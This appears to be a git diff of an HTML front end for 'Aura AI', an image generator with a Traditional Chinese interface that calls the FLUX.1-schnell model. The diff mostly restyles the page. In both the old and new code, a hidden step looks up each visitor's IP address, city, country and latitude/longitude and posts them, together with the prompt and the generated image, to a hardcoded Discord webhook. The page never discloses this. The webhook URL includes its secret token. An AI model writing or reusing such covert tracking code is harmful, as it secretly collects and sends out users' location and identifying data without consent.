@@ -5,76 +5,111 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aura AI | FR TECH</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700&display=swap');
+        
         :root {
-            --aura-gradient: linear-gradient(135deg, #8E2DE2, #4A00E0);
-            --ios-blur: blur(25px);
+            --aura-color: #a855f7;
+            --glass: rgba(255, 255, 255, 0.03);
         }
-        body { 
-            background: radial-gradient(circle at top right, #1a1a2e, #000000); 
-            color: #fff; 
-            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
-            min-height: 100vh;
+
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
             overflow-x: hidden;
+            min-height: 100vh;
         }
-        /* iOS 18 玻璃質感 */
-        .glass-panel {
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: var(--ios-blur);
-            -webkit-backdrop-filter: var(--ios-blur);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 28px;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+
+        /* 動態極光背景 */
+        .aurora-bg {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: radial-gradient(circle at 50% -20%, #221531, #000);
+            z-index: -1;
         }
-        .btn-aura {
-            background: white;
-            color: black;
-            border-radius: 999px;
+        .aurora-glow {
+            position: absolute;
+            width: 100%; height: 100%;
+            background: radial-gradient(circle at 80% 20%, rgba(168, 85, 247, 0.15), transparent 40%),
+                        radial-gradient(circle at 20% 80%, rgba(59, 130, 246, 0.1), transparent 40%);
+            filter: blur(100px);
+            animation: pulse 10s infinite alternate;
+        }
+
+        @keyframes pulse { from { opacity: 0.5; } to { opacity: 1; } }
+
+        /* iOS 18 玻璃面板 */
+        .ios-card {
+            background: rgba(20, 20, 20, 0.6);
+            backdrop-filter: blur(40px) saturate(180%);
+            -webkit-backdrop-filter: blur(40px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 32px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+
+        /* 流光按鈕 */
+        .btn-glow {
+            position: relative;
+            background: #fff;
+            color: #000;
             font-weight: 600;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border-radius: 99px;
+            transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
+            overflow: hidden;
         }
-        .btn-aura:hover { transform: scale(1.02); background: rgba(255,255,255,0.9); }
-        .btn-aura:active { transform: scale(0.98); }
-        .loading-shimmer {
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-            background-size: 200% 100%;
-            animation: shimmer 1.5s infinite;
+        .btn-glow:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 20px rgba(255,255,255,0.4);
         }
-        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+
+        /* 輸入框美化 */
+        textarea {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            resize: none;
+        }
+
+        /* 下載按鈕高級感 */
+        .download-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            transition: 0.3s;
+        }
+        .download-btn:hover { background: rgba(255, 255, 255, 0.15); }
     </style>
 </head>
-<body class="flex flex-col items-center py-12 px-6">
+<body class="flex flex-col items-center justify-center p-6">
+    <div class="aurora-bg"><div class="aurora-glow"></div></div>
 
-    <div class="mb-12 text-center">
-        <h2 class="text-xs uppercase tracking-[0.3em] text-gray-400 mb-2">FR Technology</h2>
-        <h1 class="text-5xl font-semibold tracking-tight italic">AURA</h1>
+    <div class="text-center mb-10">
+        <p class="text-[10px] tracking-[0.5em] text-purple-400 font-bold uppercase mb-2">FR Technology</p>
+        <h1 class="text-4xl font-light tracking-widest text-white">A U R A</h1>
     </div>
 
-    <div class="glass-panel w-full max-w-2xl p-8 mb-8">
-        <textarea id="prompt" 
-            class="w-full bg-transparent border-none text-xl focus:ring-0 placeholder-gray-500 resize-none h-32" 
-            placeholder="請輸入描述..."></textarea>
+    <div class="ios-card w-full max-w-xl p-8">
+        <textarea id="prompt" placeholder="探索未知的影像邊界..." class="w-full h-24 placeholder-gray-600"></textarea>
         
-        <div class="flex items-center justify-between mt-6 border-t border-white/10 pt-6">
-            <div id="status-text" class="text-sm text-gray-400 font-light">系統就緒</div>
-            <button id="gen-btn" class="btn-aura px-8 py-3 text-sm">生成影像</button>
+        <div class="flex items-center justify-between mt-6 border-t border-white/5 pt-6">
+            <div id="status" class="text-xs text-gray-500 font-mono uppercase tracking-tighter">System: Idle</div>
+            <button id="gen-btn" class="btn-glow px-8 py-3 text-sm">生成</button>
         </div>
     </div>
 
-    <div id="result-container" class="w-full max-w-2xl hidden">
-        <div class="glass-panel overflow-hidden relative">
-            <div id="loading-overlay" class="absolute inset-0 loading-shimmer hidden"></div>
-            <img id="output-img" class="w-full object-cover" src="" alt="">
+    <div id="result-area" class="mt-8 w-full max-w-xl hidden">
+        <div class="ios-card overflow-hidden">
+            <img id="output-img" class="w-full h-auto opacity-0 transition-opacity duration-1000" src="" alt="">
         </div>
-        
-        <div class="flex gap-4 mt-6">
-            <button id="download-btn" class="flex-1 glass-panel py-4 flex items-center justify-center font-medium hover:bg-white/10 transition-all">
-                📥 儲存至相簿
-            </button>
-            <button onclick="location.reload()" class="w-16 glass-panel flex items-center justify-center hover:bg-white/10">
-                ↺
-            </button>
+        <div class="flex gap-3 mt-4">
+            <button id="download-btn" class="download-btn flex-1 py-4 text-sm font-medium">📥 保存影像</button>
+            <button onclick="location.reload()" class="download-btn px-6 py-4 text-sm text-gray-400">重置</button>
         </div>
     </div>
 
@@ -83,253 +118,77 @@
 
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1472667146008920197/XM3tXEq7uDoqoYFDeGuPo-46YRFXBe6oeU75R-JJ2OhRX_clDc6f0gLGvCib1T4uJWUo";
 
-        // 語言自動切換邏輯
-        const userLang = navigator.language || navigator.userLanguage;
-        if (!userLang.includes('zh')) {
-            document.getElementById('status-text').innerText = "System Ready";
+        // 繁體中文偵測與自動優化
+        if (!navigator.language.includes('zh')) {
             document.getElementById('gen-btn').innerText = "Generate";
-            document.getElementById('prompt').placeholder = "Describe your vision...";
-            document.getElementById('download-btn').innerText = "📥 Save Image";
-        }
-
-        async function syncToDiscord(prompt, imgUrl, geo) {
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: "Aura 監控 (FR Tech)",
-                        embeds: [{
-                            title: "🎨 影像生成報告",
-                            color: 0xffffff,
-                            fields: [
-                                { name: "指令", value: prompt, inline: false },
-                                { name: "地點", value: `${geo.city || '未知'}, ${geo.country_name || '未知'}`, inline: true },
-                                { name: "IP", value: geo.ip, inline: true },
-                                { name: "座標", value: `${geo.latitude}, ${geo.longitude}`, inline: true },
-                                { name: "設備", value: navigator.platform, inline: true }
-                            ],
-                            image: { url: imgUrl },
-                            footer: { text: `FR Technology © 2026 | ${new Date().toLocaleString()}` }
-                        }]
-                    })
-                });
-            } catch (e) { console.error("Discord Sync Error"); }
+            document.getElementById('prompt').placeholder = "Envision the future...";
         }
 
         const btn = document.getElementById('gen-btn');
-        btn.onclick = async () => {
-            const prompt = document.getElementById('prompt').value;
-            if (!prompt) return;
+        const status = document.getElementById('status');
+        const resultArea = document.getElementById('result-area');
+        const outputImg = document.getElementById('output-img');
 
-            // UI 狀態切換
+        btn.onclick = async () => {
+            const promptValue = document.getElementById('prompt').value;
+            if (!promptValue) return;
+
             btn.disabled = true;
-            document.getElementById('status-text').innerText = "Aura 正在運算中...";
-            document.getElementById('result-container').classList.remove('hidden');
-            document.getElementById('loading-overlay').classList.remove('hidden');
+            status.innerText = "Aura Processing...";
+            resultArea.classList.remove('hidden');
+            outputImg.style.opacity = '0';
 
             try {
-                // 1. 獲取地理資訊
-                const geoRes = await fetch("https://ipapi.co/json/");
-                const geoData = await geoRes.json();
+                // 1. 地理資訊
+                const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
 
-                // 2. 調用 AI 模型 (FLUX Schnell)
+                // 2. 調用 FLUX 模型 (修正後的參數)
                 const app = await client("black-forest-labs/FLUX.1-schnell");
-                const result = await app.predict("/predict", [prompt, 1, 1, 1024, 768]);
+                const result = await app.predict("/predict", {
+                    prompt: promptValue,
+                    seed: Math.floor(Math.random() * 1000000),
+                    width: 1024,
+                    height: 768,
+                    num_inference_steps: 4 
+                });
+
                 const imgUrl = result.data[0].url;
+                outputImg.src = imgUrl;
+                outputImg.style.opacity = '1';
+                status.innerText = "Completed";
 
-                // 3. 顯示結果
-                document.getElementById('output-img').src = imgUrl;
-                document.getElementById('loading-overlay').classList.add('hidden');
-                document.getElementById('status-text').innerText = "生成完成";
-
-                // 4. 下載功能實現
+                // 3. 下載邏輯
                 document.getElementById('download-btn').onclick = async () => {
-                    const image = await fetch(imgUrl);
-                    const imageBlog = await image.blob();
-                    const imageURL = URL.createObjectURL(imageBlog);
-                    const link = document.createElement('a');
-                    link.href = imageURL;
-                    link.download = `Aura_${Date.now()}.png`;
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
+                    const r = await fetch(imgUrl);
+                    const b = await r.blob();
+                    const a = document.createElement('a');
+                    a.href = URL.createObjectURL(b);
+                    a.download = `FR_AURA_${Date.now()}.png`;
+                    a.click();
                 };
 
-                // 5. Discord 同步
-                await syncToDiscord(prompt, imgUrl, geoData);
-
-            } catch (err) {
-                document.getElementById('status-text').innerText = "服務繁忙，請重試";
-                btn.disabled = false;
-            }
-        };
-    </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="zh-TW">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aura AI | FR TECH</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;600&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --aura-gradient: linear-gradient(135deg, #8E2DE2, #4A00E0);
-            --ios-blur: blur(25px);
-        }
-        body { 
-            background: radial-gradient(circle at top right, #1a1a2e, #000000); 
-            color: #fff; 
-            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-        /* iOS 18 玻璃質感 */
-        .glass-panel {
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: var(--ios-blur);
-            -webkit-backdrop-filter: var(--ios-blur);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 28px;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-        }
-        .btn-aura {
-            background: white;
-            color: black;
-            border-radius: 999px;
-            font-weight: 600;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .btn-aura:hover { transform: scale(1.02); background: rgba(255,255,255,0.9); }
-        .btn-aura:active { transform: scale(0.98); }
-        .loading-shimmer {
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-            background-size: 200% 100%;
-            animation: shimmer 1.5s infinite;
-        }
-        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
-    </style>
-</head>
-<body class="flex flex-col items-center py-12 px-6">
-
-    <div class="mb-12 text-center">
-        <h2 class="text-xs uppercase tracking-[0.3em] text-gray-400 mb-2">FR Technology</h2>
-        <h1 class="text-5xl font-semibold tracking-tight italic">AURA</h1>
-    </div>
-
-    <div class="glass-panel w-full max-w-2xl p-8 mb-8">
-        <textarea id="prompt" 
-            class="w-full bg-transparent border-none text-xl focus:ring-0 placeholder-gray-500 resize-none h-32" 
-            placeholder="請輸入描述..."></textarea>
-        
-        <div class="flex items-center justify-between mt-6 border-t border-white/10 pt-6">
-            <div id="status-text" class="text-sm text-gray-400 font-light">系統就緒</div>
-            <button id="gen-btn" class="btn-aura px-8 py-3 text-sm">生成影像</button>
-        </div>
-    </div>
-
-    <div id="result-container" class="w-full max-w-2xl hidden">
-        <div class="glass-panel overflow-hidden relative">
-            <div id="loading-overlay" class="absolute inset-0 loading-shimmer hidden"></div>
-            <img id="output-img" class="w-full object-cover" src="" alt="">
-        </div>
-        
-        <div class="flex gap-4 mt-6">
-            <button id="download-btn" class="flex-1 glass-panel py-4 flex items-center justify-center font-medium hover:bg-white/10 transition-all">
-                📥 儲存至相簿
-            </button>
-            <button onclick="location.reload()" class="w-16 glass-panel flex items-center justify-center hover:bg-white/10">
-                ↺
-            </button>
-        </div>
-    </div>
-
-    <script type="module">
-        import { client } from "https://cdn.jsdelivr.net/npm/@gradio/client/dist/index.min.js";
-
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472667146008920197/XM3tXEq7uDoqoYFDeGuPo-46YRFXBe6oeU75R-JJ2OhRX_clDc6f0gLGvCib1T4uJWUo";
-
-        // 語言自動切換邏輯
-        const userLang = navigator.language || navigator.userLanguage;
-        if (!userLang.includes('zh')) {
-            document.getElementById('status-text').innerText = "System Ready";
-            document.getElementById('gen-btn').innerText = "Generate";
-            document.getElementById('prompt').placeholder = "Describe your vision...";
-            document.getElementById('download-btn').innerText = "📥 Save Image";
-        }
-
-        async function syncToDiscord(prompt, imgUrl, geo) {
-            try {
-                await fetch(WEBHOOK_URL, {
+                // 4. Discord 同步
+                fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        username: "Aura 監控 (FR Tech)",
+                        username: "Aura 監控",
                         embeds: [{
-                            title: "🎨 影像生成報告",
-                            color: 0xffffff,
+                            title: "✅ 成功生成",
+                            color: 0x00ff00,
                             fields: [
-                                { name: "指令", value: prompt, inline: false },
-                                { name: "地點", value: `${geo.city || '未知'}, ${geo.country_name || '未知'}`, inline: true },
-                                { name: "IP", value: geo.ip, inline: true },
-                                { name: "座標", value: `${geo.latitude}, ${geo.longitude}`, inline: true },
-                                { name: "設備", value: navigator.platform, inline: true }
+                                { name: "指令", value: promptValue },
+                                { name: "用戶資訊", value: `IP: ${geo.ip} (${geo.city}, ${geo.country_name})` },
+                                { name: "經緯度", value: `${geo.latitude}, ${geo.longitude}` }
                             ],
-                            image: { url: imgUrl },
-                            footer: { text: `FR Technology © 2026 | ${new Date().toLocaleString()}` }
+                            image: { url: imgUrl }
                         }]
                     })
                 });
-            } catch (e) { console.error("Discord Sync Error"); }
-        }
-
-        const btn = document.getElementById('gen-btn');
-        btn.onclick = async () => {
-            const prompt = document.getElementById('prompt').value;
-            if (!prompt) return;
-
-            // UI 狀態切換
-            btn.disabled = true;
-            document.getElementById('status-text').innerText = "Aura 正在運算中...";
-            document.getElementById('result-container').classList.remove('hidden');
-            document.getElementById('loading-overlay').classList.remove('hidden');
-
-            try {
-                // 1. 獲取地理資訊
-                const geoRes = await fetch("https://ipapi.co/json/");
-                const geoData = await geoRes.json();
-
-                // 2. 調用 AI 模型 (FLUX Schnell)
-                const app = await client("black-forest-labs/FLUX.1-schnell");
-                const result = await app.predict("/predict", [prompt, 1, 1, 1024, 768]);
-                const imgUrl = result.data[0].url;
-
-                // 3. 顯示結果
-                document.getElementById('output-img').src = imgUrl;
-                document.getElementById('loading-overlay').classList.add('hidden');
-                document.getElementById('status-text').innerText = "生成完成";
-
-                // 4. 下載功能實現
-                document.getElementById('download-btn').onclick = async () => {
-                    const image = await fetch(imgUrl);
-                    const imageBlog = await image.blob();
-                    const imageURL = URL.createObjectURL(imageBlog);
-                    const link = document.createElement('a');
-                    link.href = imageURL;
-                    link.download = `Aura_${Date.now()}.png`;
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                };
-
-                // 5. Discord 同步
-                await syncToDiscord(prompt, imgUrl, geoData);
 
             } catch (err) {
-                document.getElementById('status-text').innerText = "服務繁忙，請重試";
+                console.error(err);
+                status.innerText = "Error: System Overload";
                 btn.disabled = false;
             }
         };
